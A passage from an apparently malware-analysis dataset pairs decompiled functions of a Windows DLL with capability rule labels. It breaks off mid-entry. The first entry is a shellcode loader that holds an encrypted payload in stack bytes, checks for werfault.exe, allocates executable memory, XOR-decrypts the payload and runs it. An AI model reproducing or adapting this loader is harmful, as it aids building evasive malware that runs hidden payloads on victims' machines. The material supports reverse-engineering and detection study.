0x4e;\n        uStack803 = 0xbf;\n        uStack802 = 0x21;\n        uStack801 = 0x6c;\n        uStack800 = 0x72;\n        uStack799 = 0x1d;\n        uStack798 = 0x78;\n        uStack797 = 0x76;\n        uStack796 = 0xcd;\n        uStack795 = 0x50;\n        uStack794 = 0x23;\n        uStack793 = 0xdd;\n        uStack792 = 0x82;\n        uStack791 = 0x1f;\n        uStack790 = 0x2d;\n        uStack789 = 0x33;\n        uStack788 = 0x29;\n        uStack787 = 199;\n        uStack786 = 0x95;\n        uStack785 = 0x58;\n        uStack784 = 0x99;\n        uStack783 = 0xbc;\n        uStack782 = 99;\n        uStack781 = 0x39;\n        uStack780 = 0xdb;\n        uStack779 = 0xa8;\n        uStack778 = 0x34;\n        uStack777 = 0x49;\n        uStack776 = 0xb4;\n        uStack775 = 0x93;\n        uStack774 = 0x78;\n        uStack773 = 0x3a;\n        uStack772 = 0xb6;\n        uStack771 = 0x22;\n        uStack770 = 0x7c;\n        uStack769 = 0x4f;\n        uStack768 = 0x30;\n        uStack767 = 100;\n        uStack766 = 0x1d;\n        uStack765 = 0x8b;\n        uStack764 = 0xa9;\n        uStack763 = 0x60;\n        uStack762 = 7;\n        uStack761 = 0x42;\n        uStack760 = 0x45;\n        uStack759 = 0x1e;\n        uStack758 = 0xaf;\n        uStack757 = 0x18;\n        uStack756 = 0xef;\n        uStack755 = 0x71;\n        uStack754 = 0x53;\n        uStack753 = 0xe;\n        uStack752 = 0x35;\n        uStack751 = 100;\n        uStack750 = 0xab;\n        uStack749 = 3;\n        uStack748 = 0xda;\n        uStack747 = 0x18;\n        uStack746 = 0x55;\n        uStack745 = 0x78;\n        uStack744 = 0xc;\n        uStack743 = 0xbf;\n        uStack742 = 0x44;\n        uStack741 = 0x1b;\n        uStack740 = 0x73;\n        uStack739 = 0x56;\n        uStack738 = 0xb0;\n        uStack737 = 0x21;\n        uStack736 = 0x42;\n        uStack735 = 0x66;\n        uStack734 = 1;\n        uStack733 = 0xcf;\n        uStack732 = 0xa3;\n        uStack731 = 0x14;\n        uStack730 = 0x8b;\n        uStack729 = 0xbd;\n        uStack728 = 0x6c;\n        uStack727 = 0xbc;\n        uStack726 = 0x80;\n        uStack725 = 0x4f;\n        uStack724 = 0x22;\n        uStack723 = 0xdb;\n        uStack722 = 0x97;\n        uStack721 = 0x6e;\n        uStack720 = 0x60;\n        uStack719 = 0x44;\n        uStack718 = 0xe6;\n        uStack717 = 0x3c;\n        uStack716 = 0x6e;\n        uStack715 = 0x6d;\n        uStack714 = 0x3f;\n        uStack713 = 0x50;\n        uStack712 = 4;\n        uStack711 = 0xfa;\n        uStack710 = 0x14;\n        uStack709 = 0x4e;\n        uStack708 = 6;\n        uStack707 = 0xeb;\n        uStack706 = 0x9b;\n        uStack705 = 0x1a;\n        uStack704 = 0xb3;\n        uStack703 = 0xff;\n        uStack702 = 0x45;\n        uStack701 = 0x23;\n        uStack700 = 0x77;\n        uStack699 = 0xb2;\n        uStack698 = 1;\n        uStack697 = 0x54;\n        uStack696 = 0x6b;\n        uStack695 = 0x7b;\n        uStack694 = 0xec;\n        uStack693 = 0x49;\n        uStack692 = 0xc0;\n        uStack691 = 0xb9;\n        uStack690 = 0xb8;\n        uStack689 = 0x2e;\n        uStack688 = 0xd3;\n        uStack687 = 0xa7;\n        uStack686 = 0x69;\n        uStack685 = 0x92;\n        uStack684 = 0x30;\n        uStack683 = 0x32;\n        uStack682 = 0x31;\n        uStack681 = 0xeb;\n        uStack680 = 0x6a;\n        uStack679 = 0x4b;\n        uStack678 = 0x57;\n        uStack677 = 0x4c;\n        uStack676 = 0x17;\n        uStack675 = 0x1c;\n        uStack674 = 0x51;\n        uStack673 = 0x49;\n        uStack672 = 6;\n        uStack671 = 0x30;\n        uStack670 = 0xd0;\n        uStack669 = 0xe8;\n        uStack668 = 0x39;\n        uStack667 = 0x65;\n        uStack666 = 0x66;\n        uStack665 = 0xc;\n        uStack664 = 0xc0;\n        uStack663 = 0x33;\n        uStack662 = 0x51;\n        uStack661 = 0x1d;\n        uStack660 = 0x77;\n        uStack659 = 0x99;\n        uStack658 = 0x61;\n        uStack657 = 0xb2;\n        uStack656 = 0x2a;\n        uStack655 = 99;\n        uStack654 = 0x6a;\n        uStack653 = 0x1c;\n        uStack652 = 0x69;\n        uStack651 = 0x18;\n        uStack650 = 0xc9;\n        uStack649 = 0x78;\n        uStack648 = 0xa2;\n        uStack647 = 0xd7;\n        uStack646 = 0x57;\n        uStack645 = 0x6b;\n        uStack644 = 0x4b;\n        uStack643 = 0xdc;\n        uStack642 = 0x42;\n        uStack641 = 0xfa;\n        uStack640 = 0x89;\n        uStack639 = 0xab;\n        uStack638 = 0xdc;\n        uStack637 = 0x1e;\n        uStack636 = 0xb4;\n        uStack635 = 0x92;\n        uStack634 = 0x71;\n        uStack633 = 0x1a;\n        uStack632 = 0xb1;\n        uStack631 = 0xa7;\n        uStack630 = 0xac;\n        uStack629 = 0x50;\n        uStack628 = 0x85;\n        uStack627 = 0x84;\n        uStack626 = 0x4a;\n        uStack625 = 0x35;\n        uStack624 = 0x4a;\n        uStack623 = 0xe0;\n        uStack622 = 0x4a;\n        uStack621 = 0x59;\n        uStack620 = 0xc2;\n        uStack619 = 0xb9;\n        uStack618 = 0x2d;\n        uStack617 = 0x5e;\n        uStack616 = 0x91;\n        uStack615 = 0xfc;\n        uStack614 = 0x32;\n        uStack613 = 0x3d;\n        uStack612 = 0xb0;\n        uStack611 = 0x16;\n        uStack610 = 0xe8;\n        uStack609 = 0xab;\n        uStack608 = 0x50;\n        uStack607 = 9;\n        uStack606 = 0x72;\n        uStack605 = 0x9c;\n        uStack604 = 0x81;\n        uStack603 = 0x66;\n        uStack602 = 0xf7;\n        uStack601 = 0xe6;\n        uStack600 = 0x16;\n        uStack599 = 0x2b;\n        uStack598 = 0xf9;\n        uStack597 = 0x20;\n        uStack596 = 0x45;\n        uStack595 = 0x81;\n        uStack594 = 8;\n        uStack593 = 0x47;\n        uStack592 = 0xa8;\n        uStack591 = 0xbe;\n        uStack590 = 0x37;\n        uStack589 = 0xec;\n        uStack588 = 0xf6;\n        uStack587 = 0x4a;\n        uStack586 = 0x65;\n        uStack585 = 0xc2;\n        uStack584 = 0xa2;\n        uStack583 = 0x2d;\n        uStack582 = 0x56;\n        uStack581 = 0x22;\n        uStack580 = 0xa8;\n        uStack579 = 0x35;\n        uStack578 = 0x36;\n        uStack577 = 0x9b;\n        uStack576 = 0x62;\n        uStack575 = 0xee;\n        uStack574 = 0x99;\n        uStack573 = 0x22;\n        uStack572 = 0x59;\n        uStack571 = 0xf4;\n        uStack570 = 0x91;\n        uStack569 = 0x1e;\n        uStack568 = 0x3e;\n        uStack567 = 0x41;\n        uStack566 = 0x87;\n        uStack565 = 0xd3;\n        uStack564 = 0x30;\n        uStack563 = 0x39;\n        uStack562 = 0x65;\n        uStack561 = 0x8d;\n        uStack560 = 0x61;\n        uStack559 = 9;\n        uStack558 = 0xcf;\n        uStack557 = 0xe8;\n        uStack556 = 0x4d;\n        uStack555 = 0x75;\n        uStack554 = 0x69;\n        uStack553 = 0x24;\n        uStack552 = 0xd4;\n        uStack551 = 0x65;\n        uStack550 = 0xc2;\n        uStack549 = 0xa2;\n        uStack548 = 0x2d;\n        uStack547 = 0x56;\n        uStack546 = 0x22;\n        uStack545 = 0xa8;\n        uStack544 = 0x36;\n        uStack543 = 6;\n        uStack542 = 0x9b;\n        uStack541 = 0x45;\n        uStack540 = 0x2f;\n        uStack539 = 0xc0;\n        uStack538 = 0xd2;\n        uStack537 = 0x54;\n        uStack536 = 0x70;\n        uStack535 = 0x58;\n        uStack534 = 0x6a;\n        uStack533 = 0xb3;\n        uStack532 = 0xc9;\n        uStack531 = 0x87;\n        uStack530 = 0x13;\n        uStack529 = 0x30;\n        uStack528 = 0x39;\n        uStack527 = 0x65;\n        uStack526 = 0x22;\n        uStack525 = 0x4b;\n        uStack524 = 8;\n        uStack523 = 0x84;\n        uStack522 = 0x29;\n        uStack521 = 0xdc;\n        uStack520 = 0xf1;\n        uStack519 = 0x71;\n        uStack518 = 0x25;\n        uStack517 = 0x3f;\n        uStack516 = 0x46;\n        uStack515 = 0xb0;\n        uStack514 = 0x6d;\n        uStack513 = 0x58;\n        uStack512 = 0x50;\n        uStack511 = 0x66;\n        uStack510 = 0x21;\n        uStack509 = 3;\n        uStack508 = 0x2a;\n        uStack507 = 0x31;\n        uStack506 = 0x58;\n        uStack505 = 0xd1;\n        uStack504 = 0xa3;\n        uStack503 = 0x5e;\n        uStack502 = 8;\n        uStack501 = 0xf8;\n        uStack500 = 0xdd;\n        uStack499 = 0x72;\n        uStack498 = 0x37;\n        uStack497 = 0;\n        uStack496 = 0x3f;\n        uStack495 = 0xd8;\n        uStack494 = 0x7e;\n        uStack493 = 0xd1;\n        uStack492 = 0x29;\n        uStack491 = 0xeb;\n        uStack490 = 0xc9;\n        uStack489 = 0x55;\n        uStack488 = 0x45;\n        uStack487 = 0x6d;\n        uStack486 = 0x55;\n        uStack485 = 0xff;\n        uStack484 = 0x3f;\n        uStack483 = 200;\n        uStack482 = 0x77;\n        uStack481 = 0x45;\n        uStack480 = 0x8c;\n        uStack479 = 0x94;\n        uStack478 = 0xd;\n        uStack477 = 0x60;\n        uStack476 = 0x69;\n        uStack475 = 0x92;\n        uStack474 = 0x30;\n        uStack473 = 0x20;\n        uStack472 = 0x35;\n        uStack471 = 0x54;\n        uStack470 = 0x9f;\n        uStack469 = 3;\n        uStack468 = 0xd4;\n        uStack467 = 0x8a;\n        uStack466 = 0x59;\n        uStack465 = 0x1c;\n        uStack464 = 0x51;\n        uStack463 = 0xc6;\n        uStack462 = 0xf;\n        uStack461 = 0xbd;\n        uStack460 = 0x68;\n        uStack459 = 0xcf;\n        uStack458 = 0xc6;\n        uStack457 = 0x9a;\n        uStack456 = 0x2a;\n        uStack455 = 0xcf;\n        uStack454 = 0xe0;\n        uStack453 = 0x54;\n        uStack452 = 0x6c;\n        uStack451 = 0x55;\n        uStack450 = 0x74;\n        uStack449 = 0x2c;\n        uStack448 = 0x17;\n        uStack447 = 0xff;\n        uStack446 = 0x75;\n        uStack445 = 0x95;\n        uStack444 = 0x23;\n        uStack443 = 0xdb;\n        uStack442 = 0x99;\n        uStack441 = 0x99;\n        uStack440 = 0xda;\n        uStack439 = 0x22;\n        uStack438 = 0x1e;\n        uStack437 = 0x34;\n        uStack436 = 0x6e;\n        uStack435 = 0xd4;\n        uStack434 = 0x9f;\n        uStack433 = 0x57;\n        uStack432 = 0x4c;\n        uStack431 = 0x71;\n        uStack430 = 0x2c;\n        uStack429 = 0x4e;\n        uStack428 = 0xbd;\n        uStack427 = 0x87;\n        uStack426 = 0xef;\n        uStack425 = 0x53;\n        uStack424 = 0x30;\n        uStack423 = 0x39;\n        uStack422 = 0x2d;\n        uStack421 = 0xed;\n        uStack420 = 0x30;\n        uStack419 = 0x55;\n        uStack418 = 0x5c;\n        uStack417 = 0x86;\n        uStack416 = 0x5a;\n        uStack415 = 0x31;\n        uStack414 = 0x5a;\n        uStack413 = 0xe4;\n        uStack412 = 0x7e;\n        uStack411 = 0xcd;\n        uStack410 = 0x93;\n        uStack409 = 0x23;\n        uStack408 = 0xd3;\n        uStack407 = 0x9b;\n        uStack406 = 0x99;\n        uStack405 = 0xf5;\n        uStack404 = 0x3f;\n        uStack403 = 0xab;\n        uStack402 = 6;\n        uStack401 = 0x5f;\n        uStack400 = 0x23;\n        uStack399 = 0xc0;\n        uStack398 = 0x51;\n        uStack397 = 4;\n        uStack396 = 0xf4;\n        uStack395 = 0x98;\n        uStack394 = 0x1f;\n        uStack393 = 0xdf;\n        uStack392 = 0x4c;\n        uStack391 = 0xb4;\n        uStack390 = 0xde;\n        uStack389 = 0xb0;\n        uStack388 = 0x39;\n        uStack387 = 0x65;\n        uStack386 = 0x66;\n        uStack385 = 9;\n        uStack384 = 200;\n        uStack383 = 0x8d;\n        uStack382 = 0x19;\n        uStack381 = 0x7a;\n        uStack380 = 0xff;\n        uStack379 = 0xee;\n        uStack378 = 0x80;\n        uStack377 = 0x3f;\n        uStack376 = 0x46;\n        uStack375 = 0x47;\n        uStack374 = 0xee;\n        uStack373 = 0x98;\n        uStack372 = 0x24;\n        uStack371 = 0x43;\n        uStack370 = 0xae;\n        uStack369 = 0xbf;\n        uStack368 = 0x6a;\n        uStack367 = 0xfb;\n        uStack366 = 0x94;\n        uStack365 = 0x23;\n        uStack364 = 0xf3;\n        uStack363 = 0xfc;\n        uStack362 = 0xe6;\n        uStack361 = 0xdb;\n        uStack360 = 0xf2;\n        uStack359 = 0xc0;\n        uStack358 = 0x9c;\n        uStack357 = 0xaa;\n        uStack356 = 0x95;\n        uStack355 = 0x1b;\n        uStack354 = 199;\n        uStack353 = 0xd8;\n        uStack352 = 0xee;\n        uStack351 = 0xe9;\n        uStack350 = 0xe4;\n        uStack349 = 0x4d;\n        uStack348 = 0x44;\n        uStack347 = 0x6d;\n        uStack346 = 0x1d;\n        uStack345 = 0xb5;\n        uStack344 = 0x83;\n        uStack343 = 0x27;\n        uStack342 = 0x77;\n        uStack341 = 0x45;\n        uStack340 = 0x8c;\n        uStack339 = 0x2a;\n        uStack338 = 0x73;\n        uStack337 = 0x84;\n        uStack336 = 0x27;\n        uStack335 = 0xda;\n        uStack334 = 0xa6;\n        uStack333 = 0xad;\n        uStack332 = 0x37;\n        uStack331 = 0x7f;\n        uStack330 = 0x26;\n        uStack329 = 0xc0;\n        uStack328 = 0x93;\n        uStack327 = 5;\n        uStack326 = 0xfa;\n        uStack325 = 0x15;\n        uStack324 = 0x6a;\n        uStack323 = 0x7e;\n        uStack322 = 3;\n        uStack321 = 0xfc;\n        uStack320 = 0x12;\n        uStack319 = 0xbb;\n        uStack318 = 0xed;\n        uStack317 = 0x9a;\n        uStack316 = 0xb6;\n        uStack315 = 0xd;\n        uStack314 = 0xc4;\n        uStack313 = 0x19;\n        uStack312 = 0x45;\n        uStack311 = 0x66;\n        uStack310 = 0xb4;\n        uStack309 = 0x21;\n        uStack308 = 0xa5;\n        uStack307 = 0xfb;\n        uStack306 = 0x8e;\n        uStack305 = 0x46;\n        uStack304 = 0x6b;\n        uStack303 = 0x58;\n        uStack302 = 0x11;\n        uStack301 = 0x39;\n        uStack300 = 100;\n        uStack299 = 0x29;\n        uStack298 = 0x67;\n        uStack297 = 0x2d;\n        uStack296 = 0x16;\n        uStack295 = 0x37;\n        uStack294 = 0x14;\n        uStack293 = 9;\n        uStack292 = 0x17;\n        uStack291 = 0x2c;\n        uStack290 = 0x9b;\n        uStack289 = 0xa6;\n        uStack288 = 0x7e;\n        uStack287 = 0x89;\n        uStack286 = 99;\n        uStack285 = 0x77;\n        uStack284 = 0x38;\n        uStack283 = 0x71;\n        uStack282 = 0xec;\n        uStack281 = 0x12;\n        uStack280 = 0x60;\n        uStack279 = 0x5d;\n        uStack278 = 0x13;\n        uStack277 = 0x25;\n        uStack276 = 0xd6;\n        uStack275 = 0x98;\n        uStack274 = 0x79;\n        uStack273 = 0x41;\n        uStack272 = 0x77;\n        uStack271 = 0xcd;\n        uStack270 = 0x43;\n        uStack269 = 0x4e;\n        uStack268 = 0x38;\n        uStack267 = 0x50;\n        uStack266 = 0x66;\n        uStack265 = 0x25;\n        uStack264 = 0xfc;\n        uStack263 = 0xd7;\n        uStack262 = 0x38;\n        uStack261 = 0xdc;\n        uStack260 = 0x3b;\n        uStack259 = 0x53;\n        uStack258 = 0x1b;\n        uStack257 = 199;\n        uStack256 = 0x3b;\n        uStack255 = 0x48;\n        uStack254 = 0x27;\n        uStack253 = 0xbd;\n        uStack252 = 0x41;\n        uStack251 = 0xf;\n        uStack250 = 0x1e;\n        uStack249 = 0xb5;\n        uStack248 = 0xf9;\n        uStack247 = 0x6a;\n        uStack246 = 0xe2;\n        uStack245 = 0xf0;\n        uStack244 = 0x4d;\n        uStack243 = 0x44;\n        uStack242 = 0x6d;\n        uStack241 = 0x14;\n        uStack240 = 0x7b;\n        uStack239 = 0x79;\n        uStack238 = 0x65;\n        uStack237 = 0x67;\n        uStack236 = 0xf;\n        uStack235 = 0x24;\n        uStack234 = 0x2b;\n        uStack233 = 100;\n        uStack232 = 99;\n        uStack231 = 0xb4;\n        uStack230 = 0x68;\n        uStack229 = 0xfc;\n        uStack228 = 0x2f;\n        uStack227 = 0x83;\n        uStack226 = 0x58;\n        uStack225 = 0x14;\n        uStack224 = 0x4f;\n        uStack223 = 0x73;\n        uStack222 = 0xe;\n        uStack221 = 0xfa;\n        uStack220 = 0xc4;\n        uStack219 = 0x6a;\n        uStack218 = 0xbe;\n        uStack217 = 0;\n        uStack216 = 0x3f;\n        uStack215 = 0x53;\n        uStack214 = 0xb5;\n        uStack213 = 0xe2;\n        uStack212 = 0x11;\n        uStack211 = 0xb2;\n        uStack210 = 0xc;\n        uStack209 = 0xc6;\n        uStack208 = 0x40;\n        uStack207 = 0x49;\n        uStack206 = 0x1d;\n        uStack205 = 0xb5;\n        uStack204 = 0x81;\n        uStack203 = 0x34;\n        uStack202 = 0x7b;\n        uStack201 = 0x49;\n        uStack200 = 0xf0;\n        uStack199 = 0xbb;\n        uStack198 = 0x1d;\n        uStack197 = 0xd5;\n        uStack196 = 0xb4;\n        uStack195 = 0x51;\n        uStack194 = 0x56;\n        uStack193 = 0x6e;\n        uStack192 = 0xfb;\n        uStack191 = 0x1b;\n        uStack190 = 0x4f;\n        uStack189 = 0x43;\n        uStack188 = 0x12;\n        uStack187 = 199;\n        uStack186 = 0xab;\n        uStack185 = 0x57;\n        uStack184 = 0xd4;\n        uStack183 = 0x37;\n        uStack182 = 0xc1;\n        uStack181 = 0xf5;\n        uStack180 = 0x5e;\n        uStack179 = 0xb0;\n        uStack178 = 0;\n        uStack177 = 4;\n        uStack176 = 0x1a;\n        uStack175 = 0x47;\n        uStack174 = 0xce;\n        uStack173 = 0x86;\n        uStack172 = 0x8d;\n        uStack171 = 0x56;\n        uStack170 = 0xa4;\n        uStack169 = 0x21;\n        uStack168 = 0xdb;\n        uStack167 = 0xfe;\n        uStack166 = 0xf;\n        uStack165 = 0xc4;\n        uStack164 = 0x80;\n        uStack163 = 0x59;\n        uStack162 = 0x25;\n        uStack161 = 0x81;\n        uStack160 = 0x68;\n        uStack159 = 0xfa;\n        uStack158 = 0x32;\n        uStack157 = 0x68;\n        uStack156 = 100;\n        uStack155 = 0xa2;\n        uStack154 = 10;\n        uStack153 = 0xdc;\n        uStack152 = 0x36;\n        uStack151 = 0x51;\n        uStack150 = 0x11;\n        uStack149 = 0x69;\n        uStack148 = 0xce;\n        uStack147 = 0x41;\n        uStack146 = 6;\n        uStack145 = 0x19;\n        uStack144 = 0x28;\n        uStack143 = 0x4f;\n        uStack142 = 0xea;\n        uStack141 = 0xed;\n        uStack140 = 0x5b;\n        uStack139 = 8;\n        uStack138 = 0x77;\n        uStack137 = 0xb6;\n        uStack136 = 0x1c;\n        uStack135 = 0x77;\n        uStack134 = 0xb1;\n        uStack133 = 0x6c;\n        uStack132 = 0xb2;\n        uStack131 = 0x39;\n        uStack130 = 0x43;\n        uStack129 = 100;\n        uStack128 = 0xe6;\n        uStack127 = 0x53;\n        uStack126 = 0x2e;\n        uStack125 = 0xda;\n        uStack124 = 0xb4;\n        uStack123 = 0x67;\n        uStack122 = 0xb1;\n        uStack121 = 0x9c;\n        uStack120 = 0x66;\n        uStack119 = 0xf;\n        uStack118 = 0x54;\n        uStack117 = 0x94;\n        uStack116 = 0xf1;\n        uStack115 = 0x23;\n        uStack114 = 0x95;\n        uStack113 = 0x36;\n        uStack112 = 0x75;\n        uStack111 = 0xd2;\n        uStack110 = 0x12;\n        uStack109 = 0xbd;\n        uStack108 = 0x3d;\n        uStack107 = 0x76;\n        uStack106 = 0x5d;\n        uStack105 = 0x82;\n        uStack104 = 0x39;\n        uStack103 = 0x49;\n        uStack102 = 0x92;\n        uStack101 = 0x94;\n        uStack100 = 0x35;\n        uStack99 = 0x52;\n        uStack98 = 0x6e;\n        uStack97 = 0x27;\n        uStack96 = 0x34;\n        uStack95 = 0x96;\n        uStack94 = 0x82;\n        uStack93 = 3;\n        uStack92 = 0xaf;\n        uStack91 = 0x99;\n        uStack90 = 0xda;\n        uStack89 = 0x36;\n        uStack88 = 0xad;\n        uStack87 = 0x32;\n        uStack86 = 0x73;\n        uStack85 = 0x68;\n        uStack84 = 0x82;\n        uStack83 = 0x1e;\n        uStack82 = 0x4f;\n        uStack81 = 0xb1;\n        uStack80 = 0x57;\n        uStack79 = 0xdd;\n        uStack78 = 0x22;\n        uStack77 = 1;\n        uStack76 = 0x7e;\n        uStack75 = 0xd8;\n        uStack74 = 0x7a;\n        uStack73 = 0x25;\n        uStack72 = 0x2c;\n        uStack71 = 0x65;\n        uStack70 = 0x8c;\n        uStack69 = 0xc6;\n        uStack68 = 0x40;\n        uStack67 = 0xfc;\n        uStack66 = 0x1c;\n        uStack65 = 0x77;\n        uStack64 = 0xa9;\n        uStack63 = 0xcf;\n        uStack62 = 0x3d;\n        uStack61 = 0x75;\n        uStack60 = 0x87;\n        uStack59 = 0x23;\n        uStack58 = 0xd3;\n        uStack57 = 0xc;\n        uStack56 = 0x42;\n        uStack55 = 5;\n        uStack54 = 0x3f;\n        uStack53 = 0xad;\n        uStack52 = 4;\n        uStack51 = 0x73;\n        uStack50 = 0x43;\n        uStack49 = 3;\n        uStack48 = 0xd4;\n        uStack47 = 0x88;\n        uStack46 = 0x61;\n        uStack45 = 7;\n        uStack44 = 0xa9;\n        iVar1 = fcn.180033854(\"678894533\");\n        iVar3 = (*_sym.imp.ole32.dll_CoLoadLibrary)(L\"werfault.exe\", 0);\n        if (iVar3 == 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(1);\n            pcVar4 = swi(3);\n            (*pcVar4)();\n            return;\n        }\n        iVar5 = iVar1 + -0x28771028;\n        uVar2 = fcn.180033854(\"8192\");\n        pcVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, iVar5, uVar2 | 0x1000, 0x40);\n        iVar3 = (*_sym.imp.ole32.dll_CoTaskMemAlloc)(100000000);\n        if (iVar3 != 0) {\n            fcn.180033c90(iVar3, 0, 100000000);\n            (*_sym.imp.ole32.dll_CoTaskMemFree)(iVar3);\n        }\n        fcn.180033c90(0x18006e310, 0, 0x30);\n        *0x18006e320 = 0x23;\n        *0x18006e318 = 0x180056d00;\n        *0x18006e330 = 7;\n        *0x18006e328 = 0x912b7dc6;\n        *0x18006e310 = arg1;\n        if (0 < iVar5) {\n            pcVar6 = pcVar4;\n            iVar1 = 0;\n            do {\n                *pcVar6 = *(iVar1 % 0x23 + *0x18006e318) ^ pcVar6[auStack3016 + -pcVar4];\n                pcVar6 = pcVar6 + 1;\n                iVar5 = iVar5 + -1;\n                iVar1 = iVar1 + 1;\n            } while (iVar5 != 0);\n        }\n        (*pcVar4)(0x18006e310);\n    }\n    fcn.180032ea0(uStack40 ^ auStack3048);\n    return;\n}\n",
        "token_count": 51996
    },
    "180008c5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t * fcn.180008c54(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t **arg1_00;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t **ppiVar5;\n    \n    iVar4 = *arg2;\n    iVar3 = *arg1;\n    arg1_00 = iVar4 + -0x18;\n    ppiVar5 = iVar3 + -0x18;\n    if (arg1_00 != ppiVar5) {\n        if ((*(iVar3 + -8) < 0) || (*arg1_00 != *ppiVar5)) {\n            fcn.180008dfc(arg1, iVar4, *(iVar4 + -0x10));\n        }\n        else {\n            iVar4 = fcn.180008f18(arg1_00);\n            LOCK();\n            piVar1 = iVar3 + -8;\n            iVar2 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar2 + -1 < 1) {\n                (**(**ppiVar5 + 8))(*ppiVar5, ppiVar5);\n            }\n            *arg1 = iVar4 + 0x18;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 301
    },
    "180008ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180008ed0(int64_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint64_t arg2_00;\n    \n    iVar2 = *arg1;\n    if (*(iVar2 + -0x10) != arg2 && arg2 <= *(iVar2 + -0x10)) {\n        arg2._0_4_ = *(iVar2 + -0x10);\n    }\n    if (*(iVar2 + -8) < 2) {\n        iVar1 = *(iVar2 + -0xc);\n        if (iVar1 < arg2) {\n            if (iVar1 < 0x401) {\n                uVar3 = iVar1 * 2;\n            }\n            else {\n                uVar3 = iVar1 + 0x400;\n            }\n            arg2_00 = uVar3;\n            if (uVar3 < arg2) {\n                arg2_00 = arg2;\n            }\n            fcn.180009158(arg1, arg2_00);\n        }\n    }\n    else {\n        fcn.1800090a8(arg1, arg2);\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "180008f1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t ** fcn.180008f18(int64_t **arg1)\n\n{\n    code *pcVar1;\n    int64_t arg2;\n    int64_t *piVar2;\n    int64_t **ppiVar3;\n    \n    piVar2 = (**(**arg1 + 0x20))();\n    if ((*(arg1 + 2) < 0) || (piVar2 != *arg1)) {\n        ppiVar3 = (***piVar2)(piVar2, *(arg1 + 1), 2);\n        if (ppiVar3 == NULL) {\n            fcn.180009098();\n            pcVar1 = swi(3);\n            ppiVar3 = (*pcVar1)();\n            return ppiVar3;\n        }\n        *(ppiVar3 + 1) = *(arg1 + 1);\n        arg2 = (*(arg1 + 1) + 1) * 2;\n        fcn.180034220(ppiVar3 + 3, arg2, arg1 + 3, arg2);\n    }\n    else {\n        LOCK();\n        *(arg1 + 2) = *(arg1 + 2) + 1;\n        ppiVar3 = arg1;\n    }\n    return ppiVar3;\n}\n",
        "token_count": 277
    },
    "18000983": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.180009830(int64_t *arg1, uint64_t arg2, ulong arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    ulong *puVar5;\n    code **ppcVar6;\n    uint32_t uVar7;\n    int64_t *piVar8;\n    ulong in_stack_00000028;\n    \n    arg2 = arg2 & 0xffffffff;\n    if (arg3 == 0xfffffffe) {\n        iVar3 = fcn.180014058();\n        if (*(iVar3 + 0x68) != 0) {\n            iVar3 = fcn.180014058();\n            uVar4 = (**(**(iVar3 + 0x68) + 8))(*(iVar3 + 0x68), arg1, arg2, arg4, in_stack_00000028);\n            return uVar4;\n        }\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    if (arg3 == 0xfffffffd) {\n        uVar7 = 0;\n        if (arg4 == 0) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n        iVar3 = *(arg4 + 0x50);\n        puVar5 = (**(*arg1 + 0x58))();\n        do {\n            if ((puVar5 == NULL) || (uVar7 != 0)) {\n                return uVar7;\n            }\n            piVar8 = puVar5[1];\n            while (((*(piVar8 + 1) != 0 && (*(piVar8 + 0xc) != 0)) && (uVar7 == 0))) {\n                if (arg2 == *(piVar8 + 1)) {\n                    if (iVar3 == 0) {\n                        if (*piVar8 == 0) {\ncode_r0x0001800098fe:\n                            uVar7 = 1;\n                            *(arg4 + 8) = *(piVar8 + 0xc);\n                        }\n                    }\n                    else if ((*piVar8 != 0) && (iVar2 = fcn.180034630(iVar3, *piVar8, 0x10),  iVar2 == 0))\n                    goto code_r0x0001800098fe;\n                }\n                piVar8 = piVar8 + 2;\n            }\n            puVar5 = *puVar5;\n        } while( true );\n    }\n    uVar7 = arg3;\n    if (arg3 != 0xffffffff) {\n        uVar7 = arg3 & 0xffff;\n        uVar4 = arg3 >> 0x10;\n        if (arg3 >> 0x10 != 0) goto code_r0x00018000993c;\n    }\n    uVar4 = 0x111;\ncode_r0x00018000993c:\n    ppcVar6 = (**(*arg1 + 0x50))();\n    while( true ) {\n        if (*ppcVar6 == NULL) {\n            return 0;\n        }\n        iVar3 = fcn.180015578(ppcVar6[1], uVar4, uVar7, arg2);\n        if (iVar3 != 0) break;\n        ppcVar6 = (**ppcVar6)();\n    }\n    uVar4 = fcn.1800096ac(arg1, arg2, uVar7, *(iVar3 + 0x18));\n    return uVar4;\n}\n",
        "token_count": 817
    },
    "18001d28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
